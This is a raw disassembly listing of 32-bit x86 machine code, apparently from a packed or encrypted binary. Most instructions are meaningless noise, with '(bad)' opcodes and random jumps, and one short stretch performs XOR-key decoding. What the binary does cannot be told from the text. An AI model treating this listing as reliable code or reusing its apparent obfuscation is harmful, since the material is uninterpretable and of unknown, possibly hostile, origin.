  4074f9:	xchg   DWORD PTR [esi-0x6f931d71],edi
  4074ff:	push   edi
  407500:	cmp    cl,bl
  407502:	ret    
  407503:	mov    ah,0xcf
  407505:	sbb    BYTE PTR [eax],ch
  407507:	push   0x297cd727
  40750c:	push   edi
  40750d:	xchg   edi,eax
  40750e:	mov    dh,0x96
  407510:	shl    BYTE PTR [ecx-0x50],1
  407513:	and    DWORD PTR [edx+edx*2],esi
  407516:	add    BYTE PTR [edx],al
  407518:	daa    
  407519:	fdivr  st,st(3)
  40751b:	pop    ss
  40751c:	aaa    
  40751d:	xlat   BYTE PTR ds:[ebx]
  40751e:	push   ds
  40751f:	scas   al,BYTE PTR es:[edi]
  407520:	hlt    
  407521:	jbe    0x4074d1
  407523:	xor    eax,0x762398f5
  407528:	shl    cl,cl
  40752a:	and    eax,DWORD PTR [edx]
  40752c:	pop    ecx
  40752d:	push   ebp
  40752e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40752f:	cld    
  407530:	arpl   WORD PTR [edi-0x53745703],bp
  407536:	push   0x3ceca762
  40753b:	cmp    esi,DWORD PTR [edx-0x61035daf]
  407541:	div    BYTE PTR [edx-0x6b]
  407544:	pop    edx
  407545:	push   ebx
  407546:	pop    esp
  407547:	aaa    
  407548:	retf   0xa8b1
  40754b:	inc    eax
  40754c:	mul    esi
  40754e:	repz jp 0x4075b2
  407551:	retf   0x4862
  407554:	retf   0xb9dc
  407557:	(bad)  
  407559:	sahf   
  40755a:	push   ecx
  40755b:	fsubr  QWORD PTR [ebx]
  40755d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40755e:	lods   al,BYTE PTR ds:[esi]
  40755f:	mov    bl,BYTE PTR [esi+0x73]
  407562:	clc    
  407563:	fstp   TBYTE PTR [ebx]
  407565:	mov    edi,0x5dc69eb5
  40756a:	pop    esi
  40756b:	jge    0x407563
  40756d:	repnz inc ebx
  40756f:	into   
  407570:	pop    ecx
  407571:	fadd   DWORD PTR [eax+eax*1-0x262ac70b]
  407578:	jae    0x407503
  40757a:	and    DWORD PTR [ebx+0x6b],esi
  40757d:	push   esp
  40757e:	lock bound ebp,QWORD PTR [esi+0x47]
  407582:	fisubr WORD PTR [edx+0x52]
  407585:	ins    DWORD PTR es:[edi],dx
  407586:	pop    ss
  407587:	aas    
  407588:	inc    edx
  407589:	daa    
  40758a:	fst    QWORD PTR [eax-0x26]
  40758d:	fcom   DWORD PTR [edi-0x5f]
  407590:	mov    dl,0x8b
  407592:	dec    ebp
  407593:	mov    ah,0xf
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x7e
  407613:	add    al,0x69
  407615:	mov    esp,0x18187d17
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    al,ch
  40761f:	scas   al,BYTE PTR es:[edi]
  407620:	dec    ebp
  407621:	(bad)  
  407623:	mov    ebp,edx
  407625:	pop    ebp
  407626:	add    BYTE PTR [eax+eax*1],cl
  407629:	pop    ss
  40762a:	outs   dx,DWORD PTR ds:[esi]
  40762b:	and    al,0x5b
  40762d:	lds    esi,FWORD PTR [ebx-0x6d]
  407630:	imul   ecx,DWORD PTR [esi-0x239b917d],0xffffffcc
  407637:	test   eax,0x61d926d1
  40763c:	clc    
  40763d:	pop    es
  40763e:	out    dx,eax
  40763f:	dec    esp
  407640:	in     eax,0xbe
  407642:	cmp    edx,edx
  407644:	shl    ah,0x35
  407647:	jns    0x40767e
  407649:	adc    BYTE PTR [edi+0x47abad2f],0x2d
  407650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407651:	inc    edx
  407652:	cmp    eax,0xa0d685c0
  407657:	cmp    dl,BYTE PTR [edx]
  407659:	mov    ch,0x99
  40765b:	add    eax,0xe45f7149
  407660:	xor    bh,BYTE PTR [ebp-0x54]
  407663:	adc    bx,WORD PTR [edx]
  407666:	and    DWORD PTR [ebx+0x27],esp
  407669:	pushf  
  40766a:	pop    ecx
  40766b:	cmp    DWORD PTR [edi-0x57],eax
  40766e:	inc    edi
  40766f:	cmp    eax,0x9e5d3149
  407674:	pop    edx
  407675:	cdq    
  407676:	jle    0x407639
  407678:	mov    ebx,DWORD PTR [esi-0x7a883a13]
  40767e:	sub    BYTE PTR [eax],dh
  407680:	add    DWORD PTR [edx+0x32a0fc7f],eax
  407686:	jne    0x4076cb
  407688:	cmc    
  407689:	(bad)  
  40768a:	cli    
  40768b:	mov    ds:0x47f8e44d,al
  407690:	ret    0x6b01
  407693:	push   edi
  407694:	and    DWORD PTR [eax-0x23],esi
  407697:	cmc    
  407698:	ret    0x7806
  40769b:	pop    esp
  40769c:	jns    0x4076dd
  40769e:	lahf   
  40769f:	lods   eax,DWORD PTR ds:[esi]
  4076a0:	test   al,0x3
  4076a2:	inc    ebx
  4076a3:	push   edx
  4076a4:	out    0xc,eax
  4076a6:	adc    BYTE PTR ds:0x45c5adf8,bl
  4076ac:	push   ds
  4076ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ae:	dec    edi
  4076af:	cmp    esp,DWORD PTR [ecx+0x6b5f0171]
  4076b5:	out    0xcc,al
  4076b7:	jle    0x407697
  4076b9:	add    DWORD PTR [edx],edi
  4076bb:	add    eax,0x3cbe63f3
  4076c0:	sub    eax,0xccca41e5
  4076c5:	ins    BYTE PTR es:[edi],dx
  4076c6:	fdiv   DWORD PTR [edx+0x63]
  4076c9:	mov    edx,0xbde5e99d
  4076ce:	retf   
  4076cf:	mov    cs,WORD PTR [eax]
  4076d1:	mov    ebx,ds
  4076d3:	push   0xffffffc9
  4076d5:	out    dx,al
  4076d6:	cmp    ecx,eax
  4076d8:	dec    esp
  4076d9:	mov    ebx,0x63262b58
  4076de:	inc    eax
  4076df:	cmp    DWORD PTR [ebx+0x29],ecx
  4076e2:	xor    DWORD PTR [ecx],esi
  4076e4:	mov    dl,0xdd
  4076e6:	inc    esp
  4076e7:	jne    0x40768d
  4076e9:	clc    
  4076ea:	lods   al,BYTE PTR ds:[esi]
  4076eb:	or     al,0x24
  4076ed:	mov    edx,0x63c7b5e
  4076f2:	mov    ah,BYTE PTR [eax+0x14]
  4076f5:	cmp    eax,DWORD PTR [edx+ecx*1-0x17a06649]
  4076fc:	adc    eax,0x86338a4d
  407701:	test   DWORD PTR ds:0xf650591c,ecx
  407707:	mov    bl,0x5c
  407709:	mov    ebp,0x239ba379
  40770e:	sbb    ecx,esp
  407710:	dec    eax
  407711:	dec    eax
  407712:	inc    ebp
  407713:	into   
  407714:	push   cs
  407715:	jae    0x40772b
  407717:	cmp    BYTE PTR [edx+0x45],dh
  40771a:	mov    BYTE PTR [ecx-0x3ec13afe],0x8d
  407721:	pop    ebp
  407722:	lock sbb al,0x2b
  407725:	sahf   
  407726:	jnp    0x407748
  407728:	arpl   cx,sp
  40772a:	ins    DWORD PTR es:[edi],dx
  40772b:	xor    BYTE PTR [ebp-0x169285b],cl
  407731:	sub    BYTE PTR [esi],0x41
  407734:	outs   dx,DWORD PTR ds:[esi]
  407735:	(bad)  
  407736:	and    bl,BYTE PTR [ecx+0x70]
  407739:	mov    al,0x8c
  40773b:	test   al,0xc1
  40773d:	sub    al,0xbe
  40773f:	std    
  407740:	ret    0xaf2d
  407743:	cli    
  407744:	mov    ebp,0xd52bb761
  407749:	loopne 0x407712
  40774b:	sbb    esi,DWORD PTR [ebx+edi*4]
  40774e:	pop    edi
  40774f:	and    al,0x44
  407751:	sub    cl,ah
  407753:	and    eax,0xc868f736
  407758:	fistp  DWORD PTR [edx-0x1c6a21a5]
  40775e:	jmp    0xfdf1:0x95bf9fb4
  407765:	idiv   edx
  407767:	or     eax,0x1b6605d2
  40776c:	je     0x4076f5
  40776e:	lods   eax,DWORD PTR ds:[esi]
  40776f:	clc    
  407770:	(bad)  
  407772:	and    esi,DWORD PTR [eax]
  407774:	scas   eax,DWORD PTR es:[edi]
  407775:	dec    edi
  407776:	add    eax,0xf2e55fb8
  40777b:	xor    eax,0x58dc90d5
  407780:	test   BYTE PTR [ebp+0x3d9722eb],bl
  407786:	jmp    0xd958071f
  40778b:	cmp    DWORD PTR [eax],esi
  40778d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40778e:	cmp    eax,0x3e76dff
  407793:	xchg   BYTE PTR [ebx+ebp*8+0x674c1eb4],ch
  40779a:	aas    
  40779b:	add    edx,ebx
  40779d:	shl    BYTE PTR [edi+0x53a43a84],1
  4077a3:	fisub  WORD PTR [ebp+0x7e]
  4077a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a7:	sbb    al,0x51
  4077a9:	ret    0xb8d3
  4077ac:	push   0xec7fd083
  4077b1:	call   0x81bd6b26
  4077b6:	ss clc 
  4077b8:	sbb    ebp,DWORD PTR [edi-0x3f]
  4077bb:	jo     0x4077a4
  4077bd:	mov    ecx,DWORD PTR [edi+ecx*1]
  4077c0:	xor    eax,0x214ac704
  4077c5:	push   edi
  4077c6:	push   es
  4077c7:	mov    DWORD PTR [esp+esi*1+0x42],ecx
  4077cb:	(bad)  
  4077cc:	and    al,0x82
  4077ce:	cld    
  4077cf:	call   0x36fd11e2
  4077d4:	push   edi
  4077d5:	jmp    0x4077a5
  4077d7:	xchg   esp,eax
  4077d8:	pop    ebx
  4077d9:	mov    esi,DWORD PTR [ecx+0x58]
  4077dc:	dec    ebx
  4077dd:	xor    dl,al
  4077df:	adc    al,0xe9
  4077e1:	inc    ebp
  4077e2:	cwde   
  4077e3:	push   ds
  4077e4:	sar    esi,0xa7
  4077e7:	cmp    eax,0x9ff3489
  4077ec:	ja     0x407801
  4077ee:	ret    
  4077ef:	fimul  DWORD PTR [ecx-0x50425280]
  4077f5:	mov    esp,0xc4feaa58
  4077fa:	js     0x4077d5
  4077fc:	shr    ebx,1
  4077fe:	call   0x62d5e2ba
  407803:	popf   
  407804:	xor    bl,ch
  407806:	dec    ebx
  407807:	aaa    
  407808:	or     BYTE PTR [ebx],dh
  40780a:	or     BYTE PTR [eax-0x3628e12b],cl
  407810:	pop    ecx
  407811:	test   al,0x31
  407813:	mov    ebx,0xa2dd5717
  407818:	cmp    BYTE PTR [ecx-0x6c],dl
  40781b:	inc    ebx
  40781c:	popa   
  40781d:	fst    DWORD PTR [edi-0x70e6143d]
  407823:	in     eax,dx
  407824:	or     bh,0xca
  407827:	inc    edi
  407828:	fild   DWORD PTR [ebx]
  40782a:	rol    DWORD PTR [eax-0x34],cl
  40782d:	sbb    BYTE PTR [ebx],0xdc
  407830:	mov    esi,0xbb35324
  407835:	idiv   ebx
  407837:	add    DWORD PTR [ecx],ebp
  407839:	aad    0x7f
  40783b:	cs repz fadd st,st(4)
  40783f:	ja     0x4077fc
  407841:	mov    bh,0x3d
  407843:	lods   eax,DWORD PTR ds:[esi]
  407844:	aas    
  407845:	stos   BYTE PTR es:[edi],al
  407846:	add    eax,0x75376777
  40784b:	xchg   dh,cl
  40784d:	push   ecx
  40784e:	jl     0x40787d
  407850:	ins    DWORD PTR es:[edi],dx
  407851:	in     eax,0x1a
  407853:	jecxz  0x4077f4
  407855:	adc    BYTE PTR [eax],bl
  407857:	mov    WORD PTR [edx+0x748415bf],cs
  40785d:	xchg   ebx,eax
  40785e:	mov    ds:0x2928d814,al
  407863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407864:	enterw 0x7a39,0xb0
  407869:	or     al,0xe0
  40786b:	sbb    BYTE PTR [ebx-0xfa2fd78],0x13
  407872:	and    DWORD PTR [edi-0x3],edi
  407875:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407877:	clc    
  407878:	jno    0x407800
  40787a:	inc    esi
  40787b:	cmp    eax,0x748d2792
  407880:	ror    DWORD PTR [ecx-0x38],1
  407883:	mov    WORD PTR [ecx],?
  407885:	push   cs
  407886:	cdq    
  407887:	push   0x20
  407889:	pusha  
  40788a:	in     al,0xdc
  40788c:	mov    eax,0x9aac34cc
  407891:	push   esi
  407892:	in     al,dx
  407893:	or     dh,BYTE PTR [eax]
  407895:	ret    0x4c6a
  407898:	xchg   ebx,eax
  407899:	addr16 in eax,dx
  40789b:	(bad)  
  40789c:	jns    0x40787d
  40789e:	pop    edx
  40789f:	dec    esp
  4078a0:	add    bh,BYTE PTR [edx-0xc]
  4078a3:	les    esi,FWORD PTR [edx]
  4078a5:	jae    0x4078dd
  4078a7:	sbb    dh,al
  4078a9:	pop    ebx
  4078aa:	xor    eax,0xba9245db
  4078af:	sbb    bl,bl
  4078b1:	cld    
  4078b2:	pusha  
  4078b3:	lahf   
  4078b4:	cwde   
  4078b5:	jl     0x407926
  4078b7:	jmp    0xb5d1:0x98b8ce68
  4078be:	aam    0x54
  4078c0:	mov    edi,0x6ce5cebb
  4078c5:	lods   al,BYTE PTR ds:[esi]
  4078c6:	or     ebp,DWORD PTR [ebp+0xc]
  4078c9:	push   0xc7e897e3
  4078ce:	rol    DWORD PTR [edx+0x72],0x5d
  4078d2:	and    DWORD PTR [edi],edi
  4078d4:	fdivr  DWORD PTR [edx]
  4078d6:	(bad)  
  4078d7:	sar    BYTE PTR [eax+0x1c],0x34
  4078db:	jo     0x407944
  4078dd:	dec    edi
  4078de:	retf   0xd47c
  4078e1:	es or  al,0x27
  4078e4:	fmulp  st(3),st
  4078e6:	push   cs
  4078e7:	aam    0xe0
  4078e9:	push   esp
  4078ea:	dec    eax
  4078eb:	cmp    DWORD PTR [ebp-0x3b],ecx
  4078ee:	pop    ss
  4078ef:	add    eax,0x4d3b0ce5
  4078f4:	outs   dx,BYTE PTR ds:[esi]
  4078f5:	xchg   edx,eax
  4078f6:	repnz aaa 
  4078f8:	hlt    
  4078f9:	ss gs sub esi,eax
  4078fd:	sbb    edi,esi
  4078ff:	repz cmp al,0xe6
  407902:	icebp  
  407903:	bound  ebp,QWORD PTR [esi]
  407905:	push   edx
  407906:	cmp    ebp,eax
  407908:	in     al,0xbc
  40790a:	mov    cl,cl
  40790c:	push   edi
  40790d:	sub    cl,bl
  40790f:	mov    al,ds:0x71205e74
  407914:	outs   dx,DWORD PTR ds:[esi]
  407915:	push   esp
  407916:	mov    ch,0x5a
  407918:	mov    ecx,0xbb891a8c
  40791d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40791f:	(bad)  [edi-0x633f0cfa]
  407925:	push   0x69
  407927:	push   ebp
  407928:	nop
  407929:	stos   BYTE PTR es:[edi],al
  40792a:	fldl2e 
  40792c:	out    0xb1,al
  40792e:	stos   BYTE PTR es:[edi],al
  40792f:	pop    ss
  407930:	jp     0x407985
  407932:	lahf   
  407933:	rcl    edx,cl
  407935:	xor    DWORD PTR [esi+ecx*8+0x75743e0a],edi
  40793c:	cwde   
  40793d:	adc    cl,bl
  40793f:	leave  
  407940:	jmp    0xdf299a96
  407945:	pusha  
  407946:	xor    eax,0xbe3d91b0
  40794b:	ret    
  40794c:	es cli 
  40794e:	sub    ch,dl
  407950:	adc    BYTE PTR [ecx-0xf],0x66
  407954:	sub    dh,0x54
  407957:	inc    ebp
  407958:	jle    0x4078dd
  40795a:	xor    eax,0xcafe4e64
  40795f:	ss jp  0x407917
  407962:	push   0x2e271a73
  407967:	add    al,0x77
  407969:	ja     0x4079ac
  40796b:	sbb    al,0xc9
  40796d:	xchg   esp,eax
  40796e:	ret    
  40796f:	xor    ah,BYTE PTR ds:0xe19c6201
  407975:	or     DWORD PTR [edx],ebx
  407977:	cli    
  407978:	lock pop edi
  40797a:	push   ebx
  40797b:	rcr    esp,1
  40797d:	dec    esp
  40797e:	mov    bh,0x56
  407980:	xchg   edx,eax
  407981:	sub    eax,0x57a11f34
  407986:	icebp  
  407987:	adc    dh,ah
  407989:	test   DWORD PTR [esi],0xf508ee6f
  40798f:	daa    
  407990:	test   DWORD PTR [eax+0x5bb9391b],esi
  407996:	and    DWORD PTR [ecx+ecx*8],edi
  407999:	lock xor eax,0x3b41c5ec
  40799f:	push   ebx
  4079a0:	jo     0x407990
  4079a2:	dec    ecx
  4079a3:	test   eax,0x1c75aca8
  4079a8:	idiv   DWORD PTR [eax]
  4079aa:	pop    ebx
  4079ab:	mov    ah,0xb
  4079ad:	fdiv   QWORD PTR [edx-0x230e9652]
  4079b3:	iret   
  4079b4:	bound  ecx,QWORD PTR [ebp-0x2a]
  4079b7:	mov    dh,0x93
  4079b9:	out    0x9b,eax
  4079bb:	inc    esp
  4079bc:	sbb    dh,BYTE PTR [ebx+0x55319c3b]
  4079c2:	add    al,0x48
  4079c5:	or     DWORD PTR [eax+0x50],ebx
  4079c8:	mov    ecx,0xbfa8d07d
  4079cd:	fs ins DWORD PTR es:[edi],dx
  4079cf:	mov    edx,0xb0cc7c83
  4079d4:	outs   dx,DWORD PTR ds:[esi]
  4079d5:	loope  0x407978
  4079d7:	imul   esp,DWORD PTR [ebp+0x6d0b604f],0xfffffff5
  4079de:	cmc    
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a40
  4079f4:	(bad)  
  4079f5:	xlat   BYTE PTR ds:[ebx]
  4079f6:	mov    esp,0x1818759d
  4079fb:	sahf   
  4079fc:	adc    bl,BYTE PTR [eax]
  4079fe:	sbb    BYTE PTR [ecx+0x9e115a7],dh
  407a04:	inc    esp
  407a05:	cmp    al,0x16
  407a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a08:	scas   eax,DWORD PTR es:[edi]
  407a09:	lods   eax,DWORD PTR ds:[esi]
  407a0a:	xchg   ebx,eax
  407a0b:	or     eax,0x78de175
  407a10:	scas   eax,DWORD PTR es:[edi]
  407a11:	lods   eax,DWORD PTR gs:[esi]
  407a13:	jae    0x4079e8
  407a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a16:	jb     0x407a0f
  407a18:	inc    ebx
  407a19:	xor    ebx,edi
  407a1b:	in     al,0xbf
  407a1d:	mov    dh,0xf6
  407a1f:	adc    al,0x81
  407a21:	jns    0x4079fd
  407a23:	shr    BYTE PTR [ecx],1
  407a25:	mov    dl,0x8c
  407a27:	imul   eax,DWORD PTR [ebp-0xa2a1b6d],0x59
  407a2e:	out    0xf0,eax
  407a30:	ins    DWORD PTR es:[edi],dx
  407a31:	push   ds
  407a32:	xor    ch,ch
  407a34:	in     eax,0xfa
  407a36:	pop    esi
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	int3   
  407a3a:	jb     0x4079e3
  407a3c:	mov    dh,0x85
  407a3e:	ficom  DWORD PTR [esi+0x6afdd087]
  407a44:	dec    esp
  407a45:	mov    ebx,DWORD PTR [eax]
  407a47:	add    esp,DWORD PTR [ebx+0x7902a1e]
  407a4d:	push   esi
  407a4e:	jl     0x407a0f
  407a50:	out    dx,eax
  407a51:	or     ebp,DWORD PTR ds:0x8c3bede9
  407a57:	jg     0x407a5c
  407a59:	mov    dh,0x52
  407a5b:	pop    ebp
  407a5c:	call   0xf8b22a7b
  407a61:	or     ebp,ebx
  407a63:	xchg   DWORD PTR [edx-0x6ff7d9c2],ebx
  407a69:	retf   0x65ad
  407a6c:	inc    eax
  407a6d:	data16 jno 0x407ab5
  407a70:	fild   DWORD PTR [ebx+0x48]
  407a73:	mov    ds:0x39de48f6,al
  407a78:	add    eax,0x4f3cdf1
  407a7d:	test   BYTE PTR [edi],0xd2
  407a80:	dec    esp
  407a81:	fsubr  QWORD PTR [ebp-0x70]
  407a84:	out    0xa6,eax
  407a86:	sub    dl,BYTE PTR [edi+eax*2-0x1c]
  407a8a:	sbb    eax,0x7dc2c748
  407a8f:	sahf   
  407a90:	pusha  
  407a91:	cli    
  407a92:	and    DWORD PTR [ecx+0x79],ebp
  407a95:	cwde   
  407a96:	sub    al,0x8
  407a98:	jns    0x407a8b
  407a9a:	in     al,0xf9
  407a9c:	mov    edx,0x2cfbea84
  407aa1:	ret    0x63e2
  407aa4:	retf   0xa5f9
  407aa7:	adc    bh,BYTE PTR [edx+edi*1]
  407aaa:	or     DWORD PTR ds:0xd03f9d59,eax
  407ab0:	fadd   st,st(6)
  407ab2:	sti    
  407ab3:	and    al,0x2f
  407ab5:	ret    
  407ab6:	inc    ebx
  407ab7:	stos   DWORD PTR es:[edi],eax
  407ab8:	shl    BYTE PTR [eax],1
  407aba:	xor    DWORD PTR [eax],edx
  407abc:	push   ebx
  407abd:	inc    ebp
  407abe:	jo     0x407aff
  407ac0:	shl    BYTE PTR [edx],cl
  407ac2:	adc    DWORD PTR [eax+0x15],esi
  407ac5:	or     eax,DWORD PTR [ebx]
  407ac7:	call   0xa7700940
  407acc:	ror    DWORD PTR cs:[ebp-0x1a0b039f],0x57
  407ad4:	jns    0x407b48
  407ad6:	sub    ch,BYTE PTR [edx-0x47]
  407ad9:	sbb    BYTE PTR [ecx+0x28],bl
  407adc:	sbb    eax,0xafae75ce
  407ae1:	mov    ch,0xff
  407ae3:	test   DWORD PTR [ebp-0x454c0011],edx
  407ae9:	lahf   
  407aea:	sub    DWORD PTR [ebx+0x10],ebp
  407aed:	lods   al,BYTE PTR ds:[esi]
  407aee:	cmc    
  407aef:	test   al,0x9
  407af1:	dec    edx
  407af2:	out    dx,al
  407af3:	std    
  407af4:	xor    al,0x83
  407af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407af7:	repz add DWORD PTR [ecx+0x73c89c9f],0xffffffbc
  407aff:	add    al,0x42
  407b01:	mov    ?,edi
  407b03:	or     al,0xa2
  407b05:	sar    esp,1
  407b07:	not    DWORD PTR [ecx]
  407b09:	shl    esp,1
  407b0b:	mov    bl,0xa8
  407b0d:	rcr    DWORD PTR [eax+esi*4+0x5120e283],1
  407b14:	sti    
  407b15:	mov    bl,0x48
  407b17:	test   eax,0x9a454fa3
  407b1c:	sub    al,0x5f
  407b1e:	mov    dh,0x68
  407b20:	stc    
  407b21:	fcmovbe st,st(7)
  407b23:	sbb    ah,bl
  407b25:	idiv   DWORD PTR [ecx-0x76]
  407b28:	add    eax,0xd4e574ef
  407b2d:	mov    edx,0x7ca73091
  407b32:	in     al,dx
  407b33:	adc    edi,ebx
  407b35:	dec    esp
  407b36:	sbb    al,0xd8
  407b38:	xchg   esi,eax
  407b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b3a:	push   edi
  407b3b:	add    eax,0x96468fb6
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	and    edi,DWORD PTR [edx-0x70]
  407b44:	call   0x91a3f128
  407b49:	imul   esi,DWORD PTR [ecx-0x2d4d96e0],0x27196b8c
  407b53:	mov    dl,0x98
  407b55:	lods   eax,DWORD PTR ds:[esi]
  407b56:	cdq    
  407b57:	jecxz  0x407bb3
  407b59:	push   ss
  407b5a:	rol    DWORD PTR [ebx],0xf5
  407b5d:	dec    ebx
  407b5e:	outs   dx,BYTE PTR ds:[esi]
  407b5f:	inc    ebx
  407b60:	aam    0x82
  407b62:	das    
  407b63:	(bad)  
  407b65:	popa   
  407b66:	xchg   esp,eax
  407b67:	retf   0xa45b
  407b6a:	xor    al,0x59
  407b6c:	sbb    DWORD PTR [ebx+edi*8-0x7e6ed42a],ebp
  407b73:	lods   al,BYTE PTR ds:[esi]
  407b74:	cmp    ebx,DWORD PTR [esi-0x12e0efb8]
  407b7a:	outs   dx,BYTE PTR ds:[esi]
  407b7b:	lock cmp BYTE PTR [edi-0x3c8c55be],dl
  407b82:	scas   eax,DWORD PTR es:[edi]
  407b83:	jbe    0x407be7
  407b85:	add    al,0xec
  407b87:	lahf   
  407b88:	push   ecx
  407b89:	add    eax,esp
  407b8b:	fnsave [esp+ebp*8+0x4a79e015]
  407b92:	in     eax,dx
  407b93:	out    0x3d,eax
  407b95:	xchg   edx,eax
  407b96:	std    
  407b97:	xor    edi,DWORD PTR [edi]
  407b99:	into   
  407b9a:	mov    ch,0xe8
  407b9c:	sub    DWORD PTR [esi],esp
  407b9e:	xchg   esi,eax
  407b9f:	lock ficomp WORD PTR [edx+0x57]
  407ba3:	adc    dh,BYTE PTR [edx+0x18]
  407ba6:	push   cs
  407ba7:	hlt    
  407ba8:	lods   al,BYTE PTR ds:[esi]
  407ba9:	or     ebp,ecx
  407bab:	jmp    0xe583:0xfc6e7efe
  407bb2:	adc    BYTE PTR [edx-0x3785ec76],dh
  407bb8:	inc    edx
  407bb9:	xor    ebp,edx
  407bbb:	les    edi,FWORD PTR [ecx-0x2b37ee1f]
  407bc1:	test   al,0xc8
  407bc3:	mov    bh,0x8e
  407bc5:	dec    ebp
  407bc6:	xor    al,0xe4
  407bc8:	cld    
  407bc9:	retf   
  407bca:	(bad)  
  407bcb:	rcl    DWORD PTR [edx-0xf],1
  407bce:	pushf  
  407bcf:	adc    edi,DWORD PTR [esi-0x111074ab]
  407bd5:	cdq    
  407bd6:	mul    DWORD PTR [ebp-0x27ba1ec1]
  407bdc:	hlt    
  407bdd:	fdiv   DWORD PTR [edi]
  407bdf:	and    dh,ah
  407be1:	mov    ebp,0x7729dc29
  407be6:	xor    BYTE PTR [esi-0x18e0a677],ch
  407bec:	jae    0x407c4c
  407bee:	mov    eax,0x2368b0af
  407bf3:	js     0x407bd6
  407bf5:	je     0x407c3c
  407bf7:	xchg   esp,eax
  407bf8:	sub    dh,BYTE PTR [edi+0x16]
  407bfb:	fild   QWORD PTR [edi-0xd9bab0e]
  407c01:	push   eax
  407c02:	fdivr  DWORD PTR [edx+0xd312c2]
  407c08:	cwde   
  407c09:	mov    ebp,0x5fb5e6f2
  407c0e:	pop    eax
  407c0f:	scas   al,BYTE PTR es:[edi]
  407c10:	or     BYTE PTR [esi],al
  407c12:	mov    edx,0xe335923c
  407c17:	cdq    
  407c18:	sub    ch,al
  407c1a:	xchg   ebx,eax
  407c1b:	in     eax,dx
  407c1c:	or     ch,BYTE PTR [edx]
  407c1e:	fcom   st(0)
  407c20:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407c22:	das    
  407c23:	adc    DWORD PTR [ebx],ebx
  407c25:	wbinvd 
  407c27:	ret    
  407c28:	mov    eax,ds:0xfa85f724
  407c2d:	jmp    0x407ca9
  407c2f:	retf   0xd82c
  407c32:	dec    ecx
  407c33:	pop    ebx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	dec    esi
  407c37:	imul   ecx,ecx,0xf2c49cb
  407c3d:	pusha  
  407c3e:	mov    dh,0xf3
  407c40:	test   eax,eax
  407c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c43:	loopne 0x407c7d
  407c45:	xchg   DWORD PTR ds:0x4891118f,eax
  407c4b:	lock mov eax,ds:0x2024939
  407c51:	out    dx,eax
  407c52:	xor    al,ch
  407c54:	jae    0x407c2b
  407c56:	aad    0xd5
  407c58:	es cmp eax,eax
  407c5b:	into   
  407c5c:	add    dl,BYTE PTR [ebx+ebp*1+0x5b]
  407c60:	ret    0xd589
  407c63:	cdq    
  407c64:	mov    esp,0x5f9aca86
  407c69:	cmp    WORD PTR [esi+0x76f1974f],di
  407c70:	mov    gs,ebp
  407c72:	call   0x5486:0x73125177
  407c79:	ja     0x407c71
  407c7b:	out    dx,eax
  407c7c:	enter  0xcda3,0xca
  407c80:	push   esi
  407c81:	sub    al,0x8c
  407c83:	in     al,0x98
  407c85:	popf   
  407c86:	aas    
  407c87:	data16 jp 0x407cba
  407c8a:	dec    edx
  407c8b:	test   al,0x64
  407c8d:	in     al,0xc0
  407c8f:	call   0x4545:0x8fde6639
  407c96:	aam    0x8c
  407c98:	ret    
  407c99:	cmp    DWORD PTR [edx+0x20],edx
  407c9c:	mov    ?,WORD PTR [esi+0x3c]
  407c9f:	mov    ah,0xf1
  407ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca2:	test   al,0xf5
  407ca4:	dec    edx
  407ca5:	xor    al,0x3f
  407ca7:	loopne 0x407c6d
  407ca9:	push   ecx
